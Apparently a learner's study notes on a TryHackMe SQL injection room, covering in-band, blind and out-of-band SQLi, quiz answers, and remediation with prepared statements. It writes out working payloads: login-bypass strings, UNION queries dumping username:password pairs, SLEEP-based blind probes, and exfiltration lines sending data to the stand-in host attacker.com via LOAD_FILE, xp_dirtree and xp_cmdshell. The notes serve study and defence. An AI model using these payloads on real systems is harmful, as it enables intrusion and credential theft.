# SQL Injection Introduction – TryHackMe

**Platform:** TryHackMe  
**Room:** SQL Injection Introduction  
**Part:** 1  
**Date:** 2 September 2026  
**Level:** Beginner

---

## SQL Essentials for Injection

Before learning SQL Injection techniques, I studied some SQL features that are commonly used in injection payloads.

### SQL Comments

Comments tell the database to ignore the remaining SQL.

MySQL comment syntax:

```sql
-- 
#
/* */
```

Example:

```sql
SELECT * FROM users WHERE username='INPUT' AND password='secret';
```

Input such as:

```text
admin'-- 
```

can comment out the remaining part of the query.

### UNION

`UNION` combines the results of two or more `SELECT` statements into one result set.

The `SELECT` statements must return the **same number of columns** with compatible data types.

```sql
SELECT name, age FROM students
UNION
SELECT username, id FROM admins;
```

This is the basis of **Union-Based SQL Injection**.

### LIKE and Wildcards

`LIKE` is used for pattern matching.

- `%` → any sequence of characters
- `_` → exactly one character

```sql
SELECT * FROM users WHERE username LIKE 'adm%';
```

### LIMIT

`LIMIT` controls how many rows are returned.

```sql
SELECT * FROM users LIMIT 1;
SELECT * FROM users LIMIT 2, 1;
```

It can also be useful during injection to control which row is returned.

### String Functions

`group_concat()` combines values from multiple rows into one result.

```sql
SELECT group_concat(username, ':', password SEPARATOR '<br>') FROM users;
```

`CONCAT()` joins values together:

```sql
CONCAT(username, ':', password)
```

### information_schema

`information_schema` contains metadata about databases, tables, columns and data types.

Important tables:

- `information_schema.tables` – information about tables
- `information_schema.columns` – information about columns

It can help reveal the structure of a database during SQL Injection testing.

> SQL syntax can vary between database engines such as MySQL, MSSQL, PostgreSQL, SQLite and Oracle.

---

# What is SQL Injection?

**SQL Injection (SQLi)** occurs when user input is directly included in a SQL query without proper sanitisation or parameterisation.

The input can then be interpreted as part of the SQL query instead of just normal data.

Example:

```sql
SELECT * FROM articles WHERE id = 1 AND public = 1;
```

If input is directly concatenated, an input such as:

```text
1 OR 1=1--
```

could change the query logic:

```sql
SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;
```

Because `1=1` is always true, the query can return unintended results.

---

## Types of SQL Injection

### In-Band SQL Injection

The results of the injection are returned directly through the web application.

Two common types:

- **Error-Based** – database errors reveal information.
- **Union-Based** – `UNION` is used to retrieve additional data through the page.

### Blind SQL Injection

The application does not directly display useful query results or errors. Information is inferred from behaviour.

Examples:

- **Authentication Bypass**
- **Boolean-Based** – response changes depending on whether a condition is true or false.
- **Time-Based** – delays such as `SLEEP()` are used to infer results.

### Out-of-Band SQL Injection

The database makes an external request, such as a DNS request, allowing information to be transferred through another channel.

---

# Detecting SQL Injection

Common places to test include:

- URL parameters
- Login forms
- Search fields
- Comment fields
- Cookies
- HTTP headers

Basic test inputs include:

```text
'
"
;--
OR 1=1
```

A single quote `'` is a common first test. A database error or change in application behaviour can indicate possible SQL Injection.

If errors are hidden, behavioural or timing differences may help identify Blind SQL Injection.

---

# Questions I Answered

### What SQL statement combines results from two `SELECT` queries into one result set?

**Answer:** `UNION`

### What built-in database contains metadata about databases, tables, and columns in MySQL?

**Answer:** `information_schema`

### What character is commonly used as a first test when probing for SQL Injection?

**Answer:** `'` (single quote)

### What type of SQL Injection returns results directly in the web page?

**Answer:** In-Band SQL Injection

---

# My Takeaway

Today I learned the basic concepts of **SQL Injection** and some SQL features used when understanding injection payloads.

The main things I learned:

- SQL comments can remove the remaining part of a query.
- `UNION` combines results from multiple `SELECT` statements.
- `LIKE` is used for pattern matching.
- `LIMIT` controls returned rows.
- `CONCAT()` and `group_concat()` combine values.
- `information_schema` contains database metadata.
- SQL Injection happens when user input can change SQL query logic.
- SQLi can be **In-Band, Blind, or Out-of-Band**.
- `'` is a common first test for SQL Injection.
- **In-Band SQLi** returns results through the application response.

---

# Part 2

<!-- Space reserved for the next part of the SQL Injection Introduction room. -->



---

# Part 2

## In-Band SQL Injection

**In-Band SQL Injection** is the easiest and most common category because the same communication channel is used to send the injection and receive the results.

For example:

```text
Web Request → SQL Injection → Database → Web Page Response
```

The extracted information is visible directly in the application's response.

---

## Error-Based SQL Injection

**Error-Based SQL Injection** uses database error messages to obtain information.

If an application displays raw database errors, they may reveal:

- Database type
- SQL query structure
- Table names
- Other useful database information

For example, entering a single quote may cause a MySQL syntax error.

This can help confirm that the application is interacting with a database and that the input may be inserted into a SQL query.

> Error-Based SQLi can reveal useful structural information, but **Union-Based SQLi** is the main technique discussed for extracting larger amounts of data in this task.

---

## Union-Based SQL Injection

Union-Based SQLi uses `UNION` to append another `SELECT` query to the original query.

### Step 1 – Determine the Number of Columns

The number of columns in both `SELECT` statements must match.

Example:

```sql
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3
```

The successful query indicates the required column count.

### Step 2 – Identify Displayed Columns

Use a value that normally returns no results so that the injected result is displayed.

Example:

```sql
0 UNION SELECT 1,2,3
```

The values visible on the page show which column positions can be used for extracting information.

### Step 3 – Find the Database Name

MySQL provides the `database()` function:

```sql
0 UNION SELECT 1,2,database()
```

This returns the name of the current database.

### Step 4 – Enumerate Tables

`information_schema.tables` can be queried to discover table names.

```sql
0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema = 'database_name'
```

### Step 5 – Enumerate Columns

After finding an interesting table, its columns can be discovered:

```sql
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_name = 'target_table'
```

### Step 6 – Extract Data

Once the table and column names are known, data can be selected:

```sql
0 UNION SELECT 1,2,
group_concat(username,':',password SEPARATOR '<br>')
FROM target_table
```

### Union-Based SQLi Workflow

```text
Find Injection
      ↓
Determine Column Count
      ↓
Find Displayed Column
      ↓
Find Database Name
      ↓
Enumerate Tables
      ↓
Enumerate Columns
      ↓
Extract Relevant Data
```

### Why Each Step Matters

| Step | Purpose |
|---|---|
| Column count | `UNION` requires matching column counts |
| Displayed column | Determines where extracted data appears |
| `database()` | Identifies the current database |
| `information_schema.tables` | Finds table names |
| `information_schema.columns` | Finds column names |
| Final `SELECT` | Retrieves relevant data |

---

## Questions – Task 4

### What subtype of In-Band SQLi relies on database error messages to extract information?

**Answer:** Error-Based SQL Injection

### What SQL function returns the name of the current database in MySQL?

**Answer:** `database()`

---

# Blind SQL Injection – Authentication Bypass

Blind SQL Injection happens when the application does not directly display database results or useful error messages.

Instead, the attacker has to infer the result from the application's behaviour.

Examples of signals include:

- Successful login
- Failed login
- Different page content
- Response timing

---

## How Authentication Queries Work

A typical login query can look like:

```sql
SELECT * FROM users
WHERE username='bob'
AND password='secret123'
LIMIT 1;
```

If the query returns a row, the application may authenticate the user.

If no row is returned, authentication fails.

The important point is that the application usually does not display the database result itself. It only shows the outcome, such as a dashboard or an "Invalid credentials" message.

---

## Authentication Bypass Concept

The lesson demonstrates how changing the logic of the `WHERE` clause can cause it to evaluate as true.

Example:

```text
' OR 1=1;--
```

The resulting query can resemble:

```sql
SELECT * FROM users
WHERE username='' OR 1=1;--'
AND password='anything'
LIMIT 1;
```

The important parts are:

- `username=''` → checks an empty username
- `OR 1=1` → introduces a condition that is always true
- `--` → comments out the remaining query
- The application may receive a returned row and treat the login as successful

---

## Targeting a Specific User

If a username is already known, the lesson also demonstrates:

```text
admin'--
```

This can produce a query where the password-checking portion is commented out.

Conceptually:

```sql
SELECT * FROM users
WHERE username='admin'--'
AND password='anything'
LIMIT 1;
```

This demonstrates why directly concatenating user input into SQL queries is dangerous.

---

## Common Variations

The exact syntax depends on how the application constructs its query.

Examples covered in the lesson include:

```text
' OR 1=1;--
' OR 1=1#
" OR 1=1--
```

The vulnerable input field can also vary. Depending on the application's query construction, the username field, password field, or another input may be involved.

---

## Detection in a Login Form

During authorised security testing, authentication forms can be tested for SQL Injection by observing whether specially crafted input changes the application's authentication behaviour.

The important indicator is a difference in behaviour between normal input and SQL-manipulating input.

The practical walkthrough in this room provides a visible SQL Query box, making it easier to understand how the supplied username and password become part of the SQL query.

---

## Questions – Task 5

### What boolean condition is commonly injected to make a `WHERE` clause always evaluate to true?

**Answer:** `1=1`

---

# My Takeaway – Part 2

Today I learned more practical SQL Injection concepts:

- **In-Band SQLi** returns results through the same channel used for the injection.
- **Error-Based SQLi** uses database error messages as a source of information.
- **Union-Based SQLi** uses `UNION SELECT` to retrieve additional data.
- The number of columns must match when using `UNION`.
- `database()` can identify the current database in MySQL.
- `information_schema` can be used to understand database structure.
- The general Union-Based workflow is:
  **columns → displayed column → database → tables → columns → data**.
- **Blind SQLi** does not directly show database results.
- Authentication bypass can rely on changing the logic of a `WHERE` clause.
- `1=1` is a condition that always evaluates to true.

---

# SQL Injection Introduction — Part 3

### Task 6 Blind SQL Injection: Boolean and Time-Based

svg

Authentication bypass gets you past a login, but what if you want to pull out actual data when the application gives you no visible output? Boolean-Based and Time-Based Blind SQLi let you extract usernames, passwords, and entire databases, one character at a time.

## Boolean-Based Blind SQL Injection

In Boolean-Based Blind SQLi, the application returns a binary signal. Some kind of true/false difference. Maybe different page content, a JSON response like `{"taken":true}` vs `{"taken":false}`, or a subtle change in the HTML. You use that two-state feedback to ask the database yes/no questions.

**The idea:** Imagine a username-check feature that tells you whether an account exists. `https://website.thm/checkuser?username=admin` returns `{"taken":true}` because admin is taken. `?username=admin123` returns `{"taken": false}` because that user does not exist.

If this input is injectable, the backend query probably looks like:

```sql
SELECT * FROM users WHERE username = '%username%' LIMIT 1;
```

By injecting a `UNION SELECT` with a condition, you can ask the database arbitrary yes/no questions and read the answer from the true/false response.

**Step 1: Confirm injection.** Inject a condition that is always true:

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```

The `%` wildcard matches anything, so this should return true. If you see `{"taken":true}`, you know injection works.

**Step 2: Guess the database name, character by character.** Replace the wildcard with specific letters:

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
```

False? Not 'a'. Try `b%`, `c%`, keep going. When the response flips to true, you have found the first letter. Then move to the second character: `sa%`, `sb%`, `sc%`, etc. and keep narrowing until you have the full name.

**Step 3: Get table and column names.** Same technique against `information_schema`:

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--
```

Cycle through characters to find table names, repeat for column names with `information_schema.columns`, and then do it again for actual data values.

This is slow. Each character takes multiple requests. But it is reliable, and it works even when every other output channel is locked down.

## Time-Based Blind SQL Injection

Time-Based Blind SQLi is for when the application gives you absolutely nothing to work with visually. The page looks identical no matter what you inject. Same content, same status code, same headers. Your only signal is **how long the response takes**.

MySQL's `SLEEP()` function pauses query execution for a set number of seconds. Wrap a condition around it, and the database only pauses when the condition is true:

```sql
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
```

If the database name starts with 's', the response takes around 5 seconds. If not, it comes back right away.

**Step 1: Find the column count.** Same idea as Union-Based. Try `UNION SELECT SLEEP(5)` and add columns until you see a delay:

```sql
admin123' UNION SELECT SLEEP(5);--        -- no delay (wrong count)
admin123' UNION SELECT SLEEP(5),2;--      -- 5 second delay (2 columns!)
```

**Step 2: Enumerate data.** The process is identical to the Boolean-Based one: cycle through characters with `LIKE`. But instead of checking the page content, you watch the clock. Delay means true. No delay means false.

**A word of caution:** Network latency can mess with time-based detection. On a flaky connection, a natural lag might look like a successful `SLEEP()`. Use longer sleep values (5-10 seconds) and test each character a couple of times to be sure. On MSSQL, the equivalent is `WAITFOR DELAY '0:0:5'`.

## When To Use Which

| **ScenarioTechnique**                         |                         |
| --------------------------------------------- | ----------------------- |
| App shows different content for true vs false | Boolean-Based           |
| App response looks identical, no matter what  | Time-Based              |
| Time-based is blocked or too unreliable       | Out-of-Band (next task) |

In the practical walkthrough (Task 9), Level 3 uses Boolean-Based SQLi via a username-check API that returns `{"taken":true/false}` responses. Level 4 moves to Time-Based SQLi via the Referrer header, with no visible difference in response.

Answer the questions below

What MySQL function causes a deliberate time delay in a query's response?sleep

### Task 7svgOut-of-Band SQL Injection

svg

Out-of-Band (OOB) SQL Injection works differently from everything covered so far. Instead of reading results through the web response, you force the database server to reach out to a server you control through a separate channel, usually DNS or HTTP, and carry the stolen data with it.

## When You Need Out-Of-Band

OOB comes into play when everything else has failed:

- In-Band is off the table because the app does not show query results or errors.
- Boolean-Based does not work because the response looks the same regardless of the condition.
- Time-Based is unreliable because the network is too noisy, or `SLEEP()` is blocked.
- But the database server **can** make outbound connections. That last point is the requirement. If the firewall blocks all outbound traffic from the DB server, OOB is dead in the water.

You will not use OOB as often as In-Band or Blind, but when you hit a target where every other avenue is shut down, and the database has network access, it can be the only way to get data out.

## How It Works

Two channels are involved:

1. The **attack channel**: your normal web request with the injection payload.
2. The **data channel**: an outbound network request (DNS or HTTP) that the database server makes to your server, with the exfiltrated data baked into the request itself.

## DNS Exfiltration With MySQL

The most common OOB trick for MySQL uses `LOAD_FILE()` to trigger a DNS lookup. You embed the data you want as a subdomain:

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
```

What happens:

1. `(SELECT database())` pulls the database name. Let's say it is `webapp_db`.
2. `CONCAT()` builds the string `\\webapp_db.attacker.com\share`.
3. `LOAD_FILE()` tries to read that file path. On Windows, this initiates a DNS lookup for `webapp_db.attacker.com`.
4. Your DNS server catches the request and logs `webapp_db`. The data is in the subdomain.

This works best on Windows-based MySQL servers where UNC paths trigger DNS resolution.

## MSSQL Techniques

Microsoft SQL Server has stored procedures that make OOB more direct:

`xp_dirtree` triggers a DNS lookup by trying to list a directory on a remote server:

```sql
EXEC master..xp_dirtree '\\attacker.com\share';
```

`xp_cmdshell` (if it is enabled) runs OS commands directly, so you can use `nslookup` or `curl` to ship data out:

```sql
EXEC xp_cmdshell 'nslookup data.attacker.com';
```

`xp_cmdshell` is off by default in modern MSSQL, but `xp_dirtree` is still available and gets used regularly in pentests.

## Receiving the Data

You need something listening on your end to catch what the database sends. A few options:

- **Burp Collaborator** gives you a unique subdomain and logs any DNS or HTTP requests to it. Inject the Collaborator domain into your payload, check the Collaborator tab for callbacks.
- **Interactsh** from ProjectDiscovery does the same thing but is free and can be self-hosted.
- A **custom listener**, like a Python DNS server with `dnslib` or a bare-bones HTTP server, if you want full control.

## Limitations

OOB has constraints worth knowing about:

- The database server needs outbound network access (many production setups restrict this).
- Payloads are database-engine-specific. MySQL, MSSQL, and PostgreSQL each need different syntax.
- DNS exfiltration has a size limit: subdomain labels are limited to 63 characters each.
- It is generally slower and flakier than pulling data directly.

The practical lab in this room does not cover OOB, as it would require external DNS infrastructure. But you should understand the technique. You will hit situations in real engagements where it is the only option.

Answer the questions below

What protocol beginning with D is commonly used to exfiltrate data in Out-of-Band SQLi?

dns

What MSSQL stored procedure can be used to trigger DNS lookups for data exfiltration?xp\_dirtree

### Task 8svgRemediation and Prevention

svg

Knowing how to exploit SQLi matters, but so does knowing how to fix it. When you write up a SQLi finding for a client, you need to explain the fix, not just the bug. Here are the main defences, roughly in order of how much they help.

## Prepared Statements (Parameterised Queries)

Prepared statements are the fix. The real one. They separate SQL code from data. The developer writes the query structure with placeholders for user input, and the database receives the input separately, treating it as data only. Never as executable SQL.

**Vulnerable PHP code:**

```php
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
$result = mysqli_query($conn, $query);
```

User input gets concatenated into the query string. An attacker can escape quotes and inject whatever they want.

**Fixed with prepared statements (PDO):**

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
$result = $stmt->fetchAll();
```

The `?` is a placeholder. Whatever the user enters, even `' OR 1=1--`, the database treats the whole thing as a literal string. It never touches the query structure.

**Vulnerable Python code:**

```python
query = f"SELECT * FROM users WHERE username='{username}'"
cursor.execute(query)
```

**Fixed:**

```python
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

`%s` is a parameter placeholder. The MySQL connector handles escaping and binding for you.

Every language and framework supports this pattern. Define the query with placeholders, and pass user input as parameters. SQL Injection is gone because the input physically cannot change the query structure.

## Input Validation

Input validation controls what the application accepts before anything reaches the database. The best approach is **allowlisting**: define exactly what is valid and reject everything else.

If a parameter should be a numeric article ID, check it:

```php
if (!ctype_digit($_GET['id'])) {
    die("Invalid input");
}
```

Never rely on validation alone. Use it alongside prepared statements. Blocklisting (trying to filter out characters like `'` or `--`) is brittle. Attackers will find ways around your filter. Double encoding, alternate syntax, something you did not think of.

## Escaping User Input

Escaping means putting a backslash before special characters so the database treats them as literals instead of syntax. ' becomes `\'`.

It can stop basic injection, but it is fragile and database-specific. Every engine has different special characters and escaping rules. Use it as a last resort, such as when dealing with legacy code that cannot be refactored to use prepared statements.

## Principle of Least Privilege

Even with good input handling, defence-in-depth means limiting the blast radius. The database account the web app uses should have the bare minimum permissions:

- Read-only application? The account gets `SELECT` privileges and nothing else.
- Never connect as `root` or `sa` from the application.
- Lock down access to sensitive tables so only the procedures that need them can reach them.

If someone does exploit SQL injection through a low-privilege account, they cannot `DROP` tables, access other databases, or run system commands.

## Web Application Firewalls (WAFs)

A WAF inspects incoming requests and blocks known attack patterns: `' OR 1=1`, `UNION SELECT`, `information_schema`, that kind of thing.

But WAFs are not a substitute for writing secure code. Experienced attackers bypass them with encoding tricks, alternative syntax, and obfuscation. Treat a WAF as an extra layer, not the defence.

Answer the questions below

What is the primary and most effective defence against SQL Injection?prepared statemtns

---

# My Study Notes — Part 3

## Main Concepts

### Boolean-Based Blind SQLi
- Uses a true/false response as the information signal.
- Can be used to infer database information character by character.
- `LIKE` and `%` are useful for testing possible values.

### Time-Based Blind SQLi
- Used when there is no useful visible difference in responses.
- Uses response time as the signal.
- MySQL uses `SLEEP()` to create a deliberate delay.
- Network latency can make timing results unreliable.

### Out-of-Band SQLi
- Uses a separate communication channel to retrieve information.
- DNS and HTTP can be used as the data channel.
- The database server needs outbound network access.
- MSSQL provides techniques such as `xp_dirtree`.

### SQLi Prevention
The most important defence is:

**Prepared Statements / Parameterised Queries**

Other layers include:
- Input validation
- Least privilege
- Careful escaping where necessary
- WAF as an additional layer

---

## Questions and Answers

| Question | Answer |
|---|---|
| What MySQL function causes a deliberate time delay? | `SLEEP()` |
| What protocol beginning with D is commonly used for OOB SQLi? | DNS |
| What MSSQL stored procedure can trigger DNS lookups? | `xp_dirtree` |
| What is the primary and most effective defence against SQL Injection? | Prepared Statements |

---

## SQL Injection Technique Map

```text
                         SQL INJECTION
                              │
          ┌───────────────────┼───────────────────┐
          │                   │                   │
       In-Band             Blind              Out-of-Band
          │                   │                   │
     ┌────┴────┐        ┌────┴────┐          DNS / HTTP
     │         │        │         │
   Error     UNION   Boolean     Time
   Based     Based    Based      Based
                         │         │
                    True/False   Delay
                    response     response
```

---

## What I Learned

This part helped me understand that SQL Injection is not just one technique. The method depends on what feedback the application gives back.

If the application directly displays database results, In-Band techniques can be used. If the application hides the results, Blind SQLi can use behavioural differences or timing. If those methods are unavailable but the database can make outbound connections, Out-of-Band SQLi may provide another communication channel.

The defensive side is equally important: **prepared statements separate SQL code from user-supplied data**, preventing user input from changing the structure of the SQL query.

---

# Part 4

<!-- Space reserved for the next part of the SQL Injection Introduction room. -->

